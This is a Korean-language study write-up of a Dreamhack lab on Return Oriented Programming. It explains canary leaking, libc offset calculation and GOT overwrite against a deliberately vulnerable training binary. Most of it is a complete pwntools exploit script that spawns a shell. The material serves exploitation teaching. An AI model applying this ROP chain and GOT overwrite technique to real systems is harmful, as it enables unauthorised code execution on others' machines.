# [Dreamhack]_Return_Oriented_Programming

---

## 서론

- 실제 바이너리에서 `system` 함수가 PLT에 포함될 가능성은 거의 없음
- ASLR이 걸린 환경에서 `system` 함수를 사용하려면 프로세스에서 libc가 매핑된 주소를 찾고, 그 주소로부터 `system` 함수의 오프셋을 이용하여 함수의 주소를 계산해야 함

## Return Oriented Programming

- ROP는 리턴 가젯을 사용하여 복잡한 실행흐름을 구현하는 기법
- 공격자는 이를 이용해 `return to library`, `return to dl-resolve`, `GOT overwrite` 등의 페이로드를 구성할 수 있음
    - 지난 코스에서 `pop rdi; ret` 를 사용하여 `system("/bin/sh")` 을 호출한 것도 ROP를 사용하여 `return to library` 를 구현한 예시
- ROP 페이로드는 리턴 가젯으로 구성되는데, `ret` 단위로 여러 코드가 연쇄적으로 실행되는 모습에서 `ROP chain`이라고도 불림

## 실습 코드

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

## 분석 및 설계

---

### 보호 기법

- `checksec`로 바이너리에 적용된 보호 기법을 파악
    - 실습 환경에서 ALSR이 적용되어 있고, 바이너리에는 카나리와 NX가 적용되어 있음

```python
$ checksec rop
[*] '/home/dreamhack/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### 코드 분석

- 이전 문제와 달리 바이너리에서 `system` 함수를 호출하지 않아서 PLT에 등록되지 않으며, “bin/sh” 문자열도 데이터 섹션에 기록하지 않음
- 따라서 `system` 함수를 익스플로잇에 사용하려면 함수의 주소를 직접 구해야하고, “/bin/sh” 문자열을 사용할 다른 방법을 고민해야함

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

## 익스플로잇 설계

---

### 1. 카나리 우회

- 이전과 동일

### 2. system

- `system` 함수는 libc.so.6에 정의되어 있으며, 해당 라이브러리에는 이 바이너리가 호출하는 `read` , `puts` , `printf` 도 정의되어 있음
- 라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되므로, 다른 함수들과 함께 `system` 함수도 프로세스 메모리에 같이 적재가 됨
    - 바이너리가 `system` 함수를 직접 호출하지 않아서 `system` 함수가 GOT에는 등록되지 않음
    - 그러나 `read`, `puts` , `printf` 는 GOT에 등록됨
    - `main` 함수에서 반환될 때는 이 함수들을 모두 호출한 이후이므로, 이들의 GOT를 읽을 수 있다면 `libc.so.6`가 매핑된 영역의 주소를 구할 수 있음
    - **libc에는 여러 버전이 있는데 같은 libc안에서 두 데이터 사이의 거리(Offset)은 항상 같음**
    - **그러므로 사용한 libc의 버전을 알 때, libc가 매핑된 영역의 임의 주소를 구할 수 있으면 다른 데이터의 주소를 모두 계산할 수 있음**
    - 예를 들어, Ubuntu GLIBC 2.35-0ubuntu3.1에서 `read` 함수와 `system` 함수 사이의 거리는 항상 `0xc3c20`입니다. 따라서 read함수의 주소를 알 때, `system=read-0xc3c20으로 system` 함수의 주소를 구할 수 있음
    - libc 파일이 있으면 다음과 같이 `readelf` 명령어로 함수의 오프셋을 구할 수 있습니다.
    
    ```python
    $ readelf -s libc.so.6 | grep " read@"
       289: 0000000000114980   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
    $ readelf -s libc.so.6 | grep " system@"
      1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
    ```
    
- `read` 함수의 오프셋은 `0x114980` 이고, `system` 함수의 오프셋은 `0x50d60` 입니다. `0x114980` 에서 `0xc3c20` 를 빼면 `system` 함수의 오프셋인 `0x50d60` 를 얻을 수 있습니다.
- rop.c에서는 `read` , `puts` , `printf` 가 GOT에 등록되어 있으므로, 하나의 함수를 정해서 그 함수의 GOT 값을 읽고, 그 함수의 주소와 `system` 함수 사이의 거리를 이용해서 `system` 함수의 주소를 구해낼 수 있을 것입니다.

### 3. “/bin/sh”

- 문제 바이너리는 데이터 영역에 “/bin/sh” 문자열이 없음
- 따라서 해당 문자열을 1. 임의 버퍼에 직접 주입, 참조. 2. 다른 파일에 포함된 것을 사용
    - 후자의 방법을 선택할 때 많이 사용되는 것이 libc.so.6에 포함된 “/bin/sh” 문자열임
    - 해당 문자열의 주소도 `system` 함수의 주소를 계산할 때처럼 libc 영역의 임의 주소를 구하고. 그 주소로부터 거리를 더하거나 빼서 계산할 수 있음
    - 이 방법은 주소를 알고 있는 버퍼에 “/bin/sh” 를 입력하기 어려울 때 차선책으로 사용
    - 해당 실습에서는 전자의 방식을 사용
    
    ```python
    $ gdb rop
    pwndbg> start
    pwndbg> search /bin/sh
    Searching for value: '/bin/sh'
    libc.so.6       0x7ffff7f5a698 0x68732f6e69622f /* '/bin/sh' */
    ```
    

### 4. GOT Overwrite

- `system` 함수와 "/bin/sh" 문자열의 주소를 알고 있으므로, 지난 코스에서처럼 `pop rdi; ret` 가젯을 활용하여 `system(“/bin/sh”)`를 호출할 수 있음, 그러나 `system` 함수의 주소를 알았을 때는 이미 ROP 페이로드가 전송된 이후이므로(일반적), 알아낸 `system` 함수의 주소를 페이로드에 사용하려면 main함수로 돌아가서 다시 버퍼 오버플로우를 일으켜야 함
    - 이러한 공격 패턴을 **ret2main**이라고 함 (본 실습에서는 한 번에 셸 획득)
- **Background: Library - Dynamic Link VS. Static Link** 코스에서 Lazy binding에 대해 배운 내용을 정리해보면 다음과 같습니다.
    1. 호출할 라이브러리 함수의 주소를 프로세스에 매핑된 라이브러리에서 찾는다.
    2. 찾은 주소를 GOT에 적고, 이를 호출한다.
    3. 해당 함수를 다시 호출할 경우, GOT에 적힌 주소를 그대로 참조한다.
- 위 실습에서 GOT Overwrite에 이용되는 부분은 3번임
- GOT에 적힌 주소를 검증하지 않고 참조하므로 GOT에 적힌 주소를 변조할 수 있다면, 해당 함수가 재호출될 때 공격자가 원하는 코드가 실행되게 할 수 있음

알아낸 `system` 함수의 주소를 어떤 함수의 GOT를 재호출하도록 ROP 체인을 구성하면 될 것 같음

## 익스플로잇

---

- `read` 함수의 got를 읽고, `read` 함수와 `system` 함수의 오프셋을 이용하여 `system` 함수의 주소를 계산
- pwntools에는 `ELF.symbols` 이라는 메소드로 특정 ELF에서 심볼 사이의 오프셋을 계산할 때 유용하게 사용 가능

```python
#!/usr/bin/env python3
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
read_system = libc.symbols["read"]-libc.symbols["system"]
```

- `write` 와 `pop rdi; ret` 가젯 그리고 `pop rsi; pop r15; ret` 가젯을 사용하여 `read` 함수의 GOT를 읽고, 이를 이용해서 `system` 함수의 주소를 구하는 페이로드를 작성할 수 있음

```python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
# libc.symbols['read'] = read함수에 오프셋
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.interactive()
```

### GOT Overwrite 및 “/bin/sh” 입력

- “/bin/sh”는 덮어쓸 GOT 엔트리 뒤에 같이 입력하면 됨
    - 본 문제에서는 입력을 위해 read함수를 사용할 수 있음
    - `read` 함수는 입력 스트림, 입력 버퍼, 입력 길이 세 개의 인자가 필요
    - 함수 호출 규약(SystemX interface)에 따르면 설정해야하는 레지스터는 `rdi` , `rsi` , `rdx` 임
- `rdx` 와 관련된 가젯은 바이너리에서 찾기가 어려움
    - 이럴 때는 libc의 코드 가젯이나, libc_csu_init 가젯을 사용하여 문제를 해결할 수 있음
    - 또는 `rdx` 의 값을 변화시키는 함수를 호출해서 값을 설정할 수도 있음
        - 예를 들면 `strncmp` 함수는 rax의 비교의 결과를 반환하고, rdx로 두 문자열의 첫 번째 문자부터 가장 긴 부분 문자열의 길이를 반환함
        - libc에 포함된 rdx 가젯
        
        ```python
        $ ROPgadget --binary ./libc.so.6 --re "pop rdx"
        ...
        0x000000000011f497 : pop rdx ; pop r12 ; ret
        0x0000000000090529 : pop rdx ; pop rbx ; ret
        ...
        0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret
        ...
        ```
        
- 본 실습에선 `read` 함수의 GOT를 읽은 뒤 rdx값이 어느정도 크게 설정되므로, rdx를 설정 가젯을 추가하지는 않음(안정적인 익스플로잇을 작성하려면 가젯을 추가해도 좋음)
- `read` 함수, `pop rdi ; ret, pop rsi ; pop r15 ; ret` 가젯을 이용하여 `read` 의 GOT를 `system` 함수의 주소로 덮고, `read_got + 8` 에 “/bin/sh” 문자열을 쓰는 익스플로잇을 작성

```python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')
```

### 셸 획득

- `read` 함수의 GOT를 `system` 함수의 주소로 덮었으므로, `system("/bin/sh")` 를 실행할 수 있음
- `read` 함수, `pop rdi; ret` 가젯, “/bin/sh”의 주소(`read_got + 8`)를 이용하여 셸을 획득하는 익스플로잇을 작성

```python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = process('./rop')
# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret) # 스택 정렬하기 위함
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```

💡 8번 Line이 추가된 이유

---

Ubuntu를 최근에 설치한 경우, 문제에서 제공하는 libc 파일이 Ubuntu 환경에서 사용하는 libc 파일과 미세하게 달라질 수 있습니다. 그런 경우에는 7번 Line을 주석처리하고, 8번 Line을 주석을 해제하여 사용하는 libc 파일을 강제로 문제에서 제공하는 것으로 지정할 수 있습니다.

---